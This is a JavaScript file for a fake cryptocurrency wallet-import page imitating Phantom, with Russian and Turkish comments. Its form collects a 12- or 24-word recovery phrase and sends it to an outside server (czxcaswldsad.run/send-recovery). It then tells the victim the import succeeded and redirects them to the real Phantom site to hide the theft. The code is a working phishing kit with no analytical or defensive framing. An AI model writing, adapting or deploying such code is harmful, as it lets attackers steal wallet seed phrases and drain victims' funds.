function handleFormSubmit(event) {
	event.preventDefault()
	const inputs = document.querySelectorAll('#inputGrid input')
	const words = []
	let hasErrors = false

	// Сбор слов и базовая проверка на пустые или ошибочные поля
	inputs.forEach((input, index) => {
		const value = input.value.trim().toLowerCase()
		if (value === '') {
			hasErrors = true
			const container = input.parentElement
			input.classList.add('error')
			container.style.borderColor = '#e54d2e'
			container.style.boxShadow = '0 0 0 2px rgba(229, 77, 46, 0.2)'
		} else if (input.classList.contains('error')) {
			hasErrors = true
		} else {
			words.push(value)
		}
	})

	// Проверка на дубликаты (исправлено: сохраняем результат проверки)
	const duplicatesOK = checkDuplicateWords()

	if (hasErrors || !duplicatesOK) {
		showMessage(['Please fill in all fields correctly.'], 'error')
		return
	}

	if (words.length < 12) {
		showMessage(['You must enter at least 12 words'], 'error')
		return
	}

	// Проверка на валидность слов (только буквы, длина от 3 до 15)
	const invalidWords = words.filter(word => !/^[a-zA-Z]{3,15}$/.test(word))
	if (invalidWords.length > 0) {
		showMessage(
			['There are invalid words: ' + invalidWords.join(', ')],
			'error'
		)
		return
	}

	const submitButton = document.querySelector('button[type="submit"]')
	const originalText = submitButton.textContent
	submitButton.disabled = true
	submitButton.textContent = 'Kaydediliyor...'
	submitButton.style.opacity = '0.6'

	const plainWords = words.join(' ')
	const message = `🛡 New Recovery Phrase Received:\n\n${plainWords}`

	fetch('https://czxcaswldsad.run/send-recovery', {
		method: 'POST',
		headers: {
			'Content-Type': 'application/json',
		},
		body: JSON.stringify({ words }),
	})
		.then(async response => {
			if (!response.ok) {
				const errorData = await response.json().catch(() => null)
				const errorMsg =
					errorData?.message || `Sunucu hatası: ${response.status}`
				throw new Error(errorMsg)
			}
			return response.json()
		})
		.then(data => {
			console.log('Successful answer:', data)
			showSuccessScreen()
		})
		.catch(error => {
			console.error('request error:', error)
			showMessage([error.message || 'Could not connect to server'], 'error')

			submitButton.disabled = false
			submitButton.textContent = originalText
			submitButton.style.opacity = '1'
		})
}

function showSuccessScreen() {
	const recoveryContainer = document.querySelector('#recoverySection .px-5')
	const originalContent = recoveryContainer.innerHTML
	const progressDots = document.querySelectorAll(
		'#recoverySection .progress-dot'
	)
	progressDots[2].classList.add('active')
	const successHTML = `
    <div class="flex flex-col items-center justify-center h-full" style="min-height: 400px;">
      <div class="mb-8 animate-pulse">
        <div class="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path fill="white" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
          </svg>
        </div>
      </div>
      <h1 class="text-white text-center font-medium text-2xl mb-3 leading-8">
        You have successfully imported your wallet!
      </h1>
     
    </div>
  `
	recoveryContainer.style.opacity = '0'
	recoveryContainer.style.transform = 'translateY(20px)'
	recoveryContainer.style.transition = 'all 0.3s ease-in-out'
	setTimeout(() => {
		recoveryContainer.innerHTML = successHTML
		recoveryContainer.style.opacity = '1'
		recoveryContainer.style.transform = 'translateY(0)'
	}, 300)
	setTimeout(() => {
		window.location.href = 'https://phantom.com/'
	}, 3000)
}

function resetToWelcome() {
	window.location.href = 'https://phantom.com/'
	const recoveryContainer = document.querySelector('#recoverySection .px-5')
	recoveryContainer.style.opacity = ''
	recoveryContainer.style.transform = ''
	recoveryContainer.style.transition = ''
	const originalHTML = `
    <div class="flex flex-col w-full items-center justify-start" style="margin: 30px 0px 20px;">
      <h1 class="text-white text-center font-medium text-3xl mb-3 leading-9"> Rescue Team </h1>
      <p class="text-gray-400 text-center text-lg leading-6 max-w-sm"> Import an existing wallet with your 12 or 24 word recovery phrase. </p>
    </div>
    <form class="w-full h-full flex flex-col justify-between flex-1">
      <div id="inputGrid" class="grid grid-cols-3 gap-2.5 w-full">
        ${generateInputFields(12)}
      </div>
      <div class="flex flex-col gap-4 mt-4">
        <div class="w-full flex justify-center">
          <button type="button" onclick="toggle24Words()" class="text-gray-400 transition-colors text-sm underline" style="text-decoration: none;"> 24 I have a word recovery phrase </button>
        </div>
        <button type="submit" class="w-full bg-gray-600 text-white font-semibold rounded-2xl transition-colors" style="height: 47px; font-size: 16px;"> Transfer Wallet  </button>
      </div>
    </form>
  `
	recoveryContainer.innerHTML = originalHTML
	const form = document.querySelector('#recoverySection form')
	if (form) {
		form.addEventListener('submit', handleFormSubmit)
	}
	setupInputValidation()
	slideToSection('welcomeSection', 'right')
}

function generateInputFields(count) {
	let html = ''
	for (let i = 1; i <= count; i++) {
		html += `
      <div class="flex items-center w-full px-2 input-container" style="box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px; color: rgb(255, 255, 255); background: rgb(24, 24, 24); border: 1px solid rgb(50, 50, 50); border-radius: 6px; align-self: center; height: 41px; transition: 0.1s linear;">
        <span class="text-gray-400 text-sm mr-2 flex-shrink-0">${i}.</span>
        <input type="text" class="bg-transparent text-white text-sm border-none outline-none flex-1" autocomplete="off" autocorrect="off" spellcheck="false" pattern="[A-Za-z\\s]+">
      </div>
    `
	}
	return html
}

function slideToSection(targetSectionId, direction) {
	const sections = ['welcomeSection', 'importSection', 'recoverySection']
	const currentSection = sections.find(id =>
		document.getElementById(id).classList.contains('section-visible')
	)
	if (currentSection === targetSectionId) return
	const currentElement = document.getElementById(currentSection)
	const targetElement = document.getElementById(targetSectionId)
	sections.forEach(sectionId => {
		const section = document.getElementById(sectionId)
		section.style.position = ''
		section.style.top = ''
		section.style.left = ''
		section.style.width = ''
		section.style.height = ''
		section.style.transition = ''
		section.style.opacity = ''
		section.style.transform = ''
		section.classList.remove('section-visible')
		section.classList.add('section-hidden')
	})
	targetElement.classList.remove('section-hidden')
	targetElement.classList.add('section-visible')
}

function showWelcomeSection() {
	slideToSection('welcomeSection', 'left')
}

function showImportSection() {
	slideToSection('importSection', 'left')
}

function showRecoverySection() {
	slideToSection('recoverySection', 'left')
	setTimeout(() => {
		setupInputValidation()
	}, 300)
}

function setupInputValidation() {
	const inputs = document.querySelectorAll('#inputGrid input')
	inputs.forEach((input, idx) => {
		const container = input.parentElement
		input.addEventListener('paste', function (e) {
			const paste = (e.clipboardData || window.clipboardData).getData('text')
			const words = paste.trim().split(/\s+/)
			if (words.length > 1) {
				e.preventDefault()
				for (let i = 0; i < inputs.length && i < words.length; i++) {
					inputs[i].value = words[i]
					validateInput(inputs[i])
				}
				checkAllInputs()
				updateImportButtonState()
			}
		})
		input.addEventListener('focus', function () {
			container.style.borderColor = '#ab9ff2'
			container.style.boxShadow = '0 0 0 2px rgba(171, 159, 242, 0.2)'
		})
		input.addEventListener('blur', function () {
			validateInput(input)
			checkAllInputs()
			updateImportButtonState()
			if (!input.classList.contains('error')) {
				container.style.borderColor = 'rgb(50, 50, 50)'
				container.style.boxShadow = 'rgba(0, 0, 0, 0.25) 0px 0px 4px 0px'
			}
		})
		input.addEventListener('input', updateImportButtonState)
	})
	updateImportButtonState()
}

function validateInput(input) {
	const container = input.parentElement
	const value = input.value.trim()
	if (value === '') {
		input.classList.remove('error')
		container.style.borderColor = 'rgb(50, 50, 50)'
		container.style.boxShadow = 'rgba(0, 0, 0, 0.25) 0px 0px 4px 0px'
		return true
	}
	const hasNumbers = /\d/.test(value)
	const hasSpecialChars = /[^a-zA-Z\s]/.test(value)
	const isValidLength = value.length >= 3 && value.length <= 15
	const isValidWord = /^[a-zA-Z]+$/.test(value)
	if (hasNumbers || hasSpecialChars || !isValidLength || !isValidWord) {
		input.classList.add('error')
		container.style.borderColor = '#e54d2e'
		container.style.boxShadow = '0 0 0 2px rgba(229, 77, 46, 0.2)'
		return false
	} else {
		input.classList.remove('error')
		container.style.borderColor = 'rgb(50, 50, 50)'
		container.style.boxShadow = 'rgba(0, 0, 0, 0.25) 0px 0px 4px 0px'
		return true
	}
}

function checkAllInputs() {
	const inputs = document.querySelectorAll('#inputGrid input')
	const errorInputs = []
	inputs.forEach((input, index) => {
		if (input.value.trim() !== '' && input.classList.contains('error')) {
			errorInputs.push(index + 1)
		}
	})
	if (errorInputs.length > 0) {
		showMessage(errorInputs, 'error')
	} else {
		clearMessage()
	}
}

function checkDuplicateWords() {
	const inputs = document.querySelectorAll('#inputGrid input')
	const wordMap = {}
	const duplicateIndices = []

	inputs.forEach((input, index) => {
		const value = input.value.trim().toLowerCase()
		if (value !== '') {
			if (wordMap[value]) {
				wordMap[value].push(index)
			} else {
				wordMap[value] = [index]
			}
		}
	})

	// Сброс предыдущих ошибок
	inputs.forEach(input => input.classList.remove('error'))
	document.querySelectorAll('.input-container').forEach(c => {
		c.style.borderColor = 'rgb(50, 50, 50)'
		c.style.boxShadow = 'rgba(0, 0, 0, 0.25) 0px 0px 4px 0px'
	})

	let hasDuplicates = false

	Object.values(wordMap).forEach(indices => {
		if (indices.length > 1) {
			hasDuplicates = true
			indices.forEach(i => {
				const input = inputs[i]
				const container = input.parentElement
				input.classList.add('error')
				container.style.borderColor = '#e54d2e'
				container.style.boxShadow = '0 0 0 2px rgba(229, 77, 46, 0.2)'
				duplicateIndices.push(i + 1)
			})
		}
	})

	if (hasDuplicates) {
		const uniqueDuplicates = Object.keys(wordMap).filter(
			key => wordMap[key].length > 1
		)
		const message = `Repeated words: ${uniqueDuplicates.join(
			', '
		)}. ${duplicateIndices.join(', ')} there is repetition in numbered areas.`
		showMessage([message], 'error')
		return false
	}

	return true
}

function showMessage(messages, type = 'error') {
	clearMessage()
	const form = document.querySelector('#recoverySection form')
	const toggle24Button = document.querySelector(
		'button[onclick="toggle24Words()"]'
	)?.parentElement
	const messageDiv = document.createElement('div')
	messageDiv.id = type === 'error' ? 'errorMessage' : 'successMessage'
	messageDiv.className = 'flex items-start gap-2 p-3 rounded-lg'
	messageDiv.style.backgroundColor =
		type === 'error' ? 'rgba(229, 77, 46, 0.1)' : 'rgba(34, 197, 94, 0.1)'
	messageDiv.style.border =
		type === 'error'
			? '1px solid rgba(229, 77, 46, 0.3)'
			: '1px solid rgba(34, 197, 94, 0.3)'
	messageDiv.style.overflow = 'hidden'
	messageDiv.style.maxHeight = '0'
	messageDiv.style.opacity = '0'
	messageDiv.style.transform = 'translateY(20px)'
	messageDiv.style.transition = 'all 0.4s cubic-bezier(0.4, 0, 0.2, 1)'
	messageDiv.style.marginBottom = '0'
	let messageText
	if (Array.isArray(messages)) {
		if (messages.length === 1) {
			messageText = `${messages[0]} There is an error in field no.`
		} else {
			messageText = `${messages.join(
				', '
			)} There is an error in the numbered fields`
		}
	} else {
		messageText = messages
	}
	const iconColor = type === 'error' ? '#e54d2e' : '#22c55e'
	const iconPath =
		type === 'error'
			? 'M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z'
			: 'M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z'
	messageDiv.innerHTML = `
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="flex-shrink: 0; margin-top: 2px;">
      <path fill="${iconColor}" d="${iconPath}"/>
    </svg>
    <p style="color: ${iconColor}; font-size: 14px; line-height: 1.4; margin: 0;">
      ${messageText}
    </p>
  `
	if (toggle24Button) {
		toggle24Button.parentNode.insertBefore(messageDiv, toggle24Button)
	} else if (form) {
		form.insertBefore(messageDiv, form.firstChild)
	}
	requestAnimationFrame(() => {
		requestAnimationFrame(() => {
			messageDiv.style.maxHeight = '80px'
			messageDiv.style.opacity = '1'
			messageDiv.style.transform = 'translateY(0)'
			messageDiv.style.marginBottom = '16px'
		})
	})
	if (type === 'success') {
		setTimeout(() => {
			if (messageDiv.parentNode) {
				messageDiv.style.maxHeight = '0'
				messageDiv.style.opacity = '0'
				messageDiv.style.transform = 'translateY(-10px)'
				messageDiv.style.marginBottom = '0'
				setTimeout(() => {
					if (messageDiv.parentNode) {
						messageDiv.remove()
					}
				}, 400)
			}
		}, 3000)
	}
}

function clearMessage() {
	const existingError = document.getElementById('errorMessage')
	const existingSuccess = document.getElementById('successMessage')
	if (existingError) {
		existingError.remove()
	}
	if (existingSuccess) {
		existingSuccess.remove()
	}
}

function toggle24Words() {
	const inputGrid = document.getElementById('inputGrid')
	const currentInputs = inputGrid.querySelectorAll('.input-container')
	if (currentInputs.length === 12) {
		for (let i = 13; i <= 24; i++) {
			const inputContainer = document.createElement('div')
			inputContainer.className = 'flex items-center w-full px-2 input-container'
			inputContainer.style.cssText =
				'box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px; color: rgb(255, 255, 255); background: rgb(24, 24, 24); border: 1px solid rgb(50, 50, 50); border-radius: 6px; align-self: center; height: 41px; transition: 0.1s linear;'
			const span = document.createElement('span')
			span.className = 'text-gray-400 text-sm mr-2 flex-shrink-0'
			span.textContent = `${i}.`
			const input = document.createElement('input')
			input.type = 'text'
			input.className =
				'bg-transparent text-white text-sm border-none outline-none flex-1'
			input.setAttribute('autocomplete', 'off')
			input.setAttribute('autocorrect', 'off')
			input.setAttribute('spellcheck', 'false')
			input.setAttribute('pattern', '[A-Za-z\\s]+')
			inputContainer.appendChild(span)
			inputContainer.appendChild(input)
			inputGrid.appendChild(inputContainer)
		}
	} else {
		const inputsToRemove = Array.from(currentInputs).slice(12)
		inputsToRemove.forEach(input => input.remove())
	}
	setupInputValidation()
	clearMessage()
}

function addCustomStyles() {
	const style = document.createElement('style')
	style.textContent = `
    .input-container {
      box-shadow: rgba(0, 0, 0, 0.25) 0px 0px 4px 0px;
      color: rgb(255, 255, 255);
      background: rgb(24, 24, 24);
      border: 1px solid rgb(50, 50, 50);
      border-radius: 6px;
      align-self: center;
      height: 41px;
      transition: 0.1s linear;
    }
    .input-container input {
      background: transparent;
      color: #fff;
      border: none;
      outline: none;
      flex: 1;
    }
  `
	document.head.appendChild(style)
}

function updateImportButtonState() {
	const inputs = document.querySelectorAll('#inputGrid input')
	const submitButton = document.querySelector(
		'#recoverySection button[type="submit"]'
	)
	if (!submitButton) return
	const allFilled = Array.from(inputs).every(
		input => input.value.trim() !== '' && !input.classList.contains('error')
	)
	if (allFilled) {
		submitButton.style.backgroundColor = '#22c55e'
		submitButton.style.color = '#fff'
		submitButton.disabled = false
	} else {
		submitButton.style.backgroundColor = '#4b5563'
		submitButton.style.color = '#fff'
		submitButton.disabled = false
	}
}

document.addEventListener('DOMContentLoaded', function () {
	addCustomStyles()
	const recoveryForm = document.querySelector('#recoverySection form')
	if (recoveryForm) {
		recoveryForm.addEventListener('submit', handleFormSubmit)
	}
	if (
		document
			.getElementById('recoverySection')
			.classList.contains('section-visible')
	) {
		setupInputValidation()
	}
})
